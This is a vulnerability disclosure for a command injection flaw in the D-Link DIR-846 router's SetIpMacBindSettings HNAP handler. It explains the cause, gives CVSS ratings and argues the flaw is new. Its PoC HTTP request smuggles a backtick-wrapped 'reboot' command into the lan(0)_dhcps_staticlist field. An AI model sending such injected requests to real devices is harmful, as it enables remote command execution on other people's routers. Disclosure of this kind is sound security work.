# D-Link dir-846 Wireless Router SetIpMacBindSettings Command Injection Vulnerability

## 1. Basic Information

- Vulnerability Type: command injection
- Vulnerability Description: In D-Link dir-846 wireless router, firmware version A1_FW100A43, there is a command injection vulnerability. Its SetIpMacBindSettings component implements a security vulnerability in processing the lan(0)_dhcps_staticlist parameter, allowing remote attackers to submit special requests through the vulnerability, resulting in command injection, which can lead to the execution of arbitrary system commands.
- Device Model:
   - D-Link dir-846 wireless router
   - Firmware Version: A1_FW100A43

## 2. Vulnerability Value

- Maturity of public profile: None
- Order of Public Vulnerability Analysis Report: None
- Stable reproducibility: yes
- Vulnerability Score (refer to CVSS)
  - V2: [8.5 High AV:N/AC:M/Au:S/C:C/I:C/A:C](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator ?vector=(AV:N/AC:M/Au:S/C:C/I:C/A:C))
  - V3.1: [9.1 High AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://nvd.nist.gov /vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)
- Exploit Conditions
  - Attack Vector Type: Network
  - Attack Complexity: Low
  - Complexity of Exploit
    - Permission constraints: authentication is required
    - User Interaction: No victim interaction required
  - Scope of Impact: Changed (may affect other components than vulnerable ones)
  - Impact Indicators:
    - Confidentiality: High
    - Integrity: High
    - Availability: High
  - Stability of Vulnerability Exploitation: Stable recurrence
  - Whether the product default configuration: There are vulnerabilities in functional components that are enabled out of the factory
- Exploit Effect
  - Remote Code Execution (RCE)

## 3. PoC

```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetIpMacBindSettings"
HNAP_AUTH: 6253FA5471ACABEA23C722E4A59A3BFF 1666092978328
Content-Length: 111
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/AdvMacBindIp.html?t=1666092946356
Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D; SESSION_ID=2:1598955110:2; uid=57XIVmwX; PrivateKey=BE92EF6F235196D24907CBEE3556D5ED; timeout=0; PHPSESSID=987c30cdace5d75170e8b4482f9d4055

{"SetIpMacBindSettings":{"lan_unit":"0","lan(0)_dhcps_staticlist":"1,`reboot`asdasdasd,12:34:56:78:90:11,192.168.0.9"}}
 ```

## 4. Vulnerability principle

When the Web management component receives a POST request, its SetIpMacBindSettings component implements a security hole in processing the lan(0)_dhcps_staticlist parameter, and the lan(0)_dhcps_staticlist parameter is concatenated to execute the command. Such carefully crafted parameters lead to command injection. Attackers can use this vulnerability to directly achieve the effect of remote arbitrary command execution.

Get the parameter position of lan(0)_dhcps_staticlist as shown in the figure below: ![lan(0)_dhcps_staticlist](./imgs/2.png)

The location of the vulnerable function is shown in the picture below: ![Alt pic](./imgs/3.png)

## 5. The basis for judging as a 0-day vulnerability

### 1. Not the same vulnerability as CVE-2021-46314 and CVE-2021-46315

Search the dir-846 keyword in the NVD database and find the vulnerabilities CVE-2021-46314 and CVE-2021-46315. Refer to the github warehouse information that disclosed the vulnerability: https://github.com/doudoudedi/DIR-846_Command_Injection/blob/main/DIR-846_Command_Injection1.md, the trigger code of this vulnerability is located in `SetMasterWLanSettings` and `SetNetworkTomographySettings`, the location The location of the code triggering this vulnerability is different, so it is not the same vulnerability.

### 2. NVD database search

Searching the NVD database using SetIpMacBindSettings as a keyword yielded no results.
